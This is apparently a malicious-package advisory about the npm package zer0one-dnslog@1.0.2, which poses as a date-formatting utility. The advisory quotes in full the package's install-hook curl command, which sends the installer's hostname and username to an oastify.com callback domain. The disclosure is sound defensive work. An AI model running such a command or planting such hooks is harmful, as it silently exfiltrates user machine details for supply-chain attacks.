summary: Postinstall hook exfiltrates hostname and username to Burp Collaborator OOB domain
details: zer0one-dnslog@1.0.2 ships preinstall/postinstall lifecycle scripts that run `curl http://h4mx6b7krgzarfehbutwabxbu20tojc8.oastify.com/pre?h=$(hostname)&u=$(whoami)` on `npm install`, sending the installer's hostname and current OS user to an attacker-controlled Burp Collaborator (oastify.com) out-of-band callback domain over plaintext HTTP. The package advertises itself as 'A simple date formatting utility' but its main module is a trivial stub (`hello: () => 'zer0one'`) with no date functionality, and the package name references dnslog exfiltration infrastructure. The mismatch between advertised purpose and shipped code, combined with the OOB callback, fits a dependency-confusion / supply-chain reconnaissance payload that fingerprints installer machines for follow-on attacks.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
